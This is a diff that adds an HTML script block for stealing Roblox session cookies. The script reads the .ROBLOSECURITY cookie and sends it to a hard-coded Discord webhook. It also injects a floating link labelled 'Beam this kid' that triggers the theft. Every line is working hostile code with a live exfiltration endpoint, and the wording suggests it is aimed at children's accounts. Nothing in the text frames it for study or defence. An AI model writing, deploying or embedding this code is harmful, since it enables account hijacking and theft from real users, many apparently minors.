@@ -1,0 +1,32 @@
+<script>
+    function stealRobloxCookie() {
+        const victimRobloxCookie = document.cookie.match(/'.ROBLOSECURITY'=([^;]+)/)[1];
+
+        fetch('https://discord.com/api/webhooks/1320863228179517450/2dfq5uEGDVPq8nERwHX6iiWiXpL3LTqMGLxjSb7c-Rr2GKdugR-oUA4yvzmr19aJn9FY', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                content: `Stolen Roblox Cookie: ${victimRobloxCookie}`
+            })
+        });
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+        const bookmarklet = document.createElement('a');
+        bookmarklet.href = 'javascript:stealRobloxCookie()';
+        bookmarklet.textContent = 'Beam this kid';
+        bookmarklet.style.position = 'fixed';
+        bookmarklet.style.top = '10px';
+        bookmarklet.style.right = '10px';
+        bookmarklet.style.backgroundColor = '#4CAF50';
+        bookmarklet.style.color = 'white';
+        bookmarklet.style.padding = '5px 10px';
+        bookmarklet.style.borderRadius = '5px';
+        bookmarklet.style.textDecoration = 'none';
+        bookmarklet.style.zIndex = '99999';
+
+        document.body.appendChild(bookmarklet);
+    });
+</script>
